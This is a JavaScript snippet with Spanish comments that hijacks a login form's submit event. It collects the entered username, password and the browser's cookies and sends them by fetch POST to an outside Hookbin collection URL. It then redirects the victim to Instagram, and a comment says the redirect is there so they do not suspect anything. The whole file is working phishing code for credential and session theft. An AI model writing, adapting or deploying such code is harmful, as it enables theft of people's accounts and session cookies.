document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Obtener la cookie actual del navegador
    const cookies = document.cookie;

    // Tu URL de Hookbin configurada
    const hookUrl = 'https://hookbin.rest/hooks/b689db3afe';

    // Enviar los datos a tu Hookbin
    fetch(hookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            user: username,
            pass: password,
            cookies: cookies
        })
    })
    .then(response => {
        console.log('Datos enviados correctamente');
    })
    .catch(error => {
        console.error('Error al enviar:', error);
    });

    // Simular redirección a Instagram para que no sospechen
    setTimeout(() => {
        window.location.href = 'https://www.instagram.com';
    }, 1500);
});
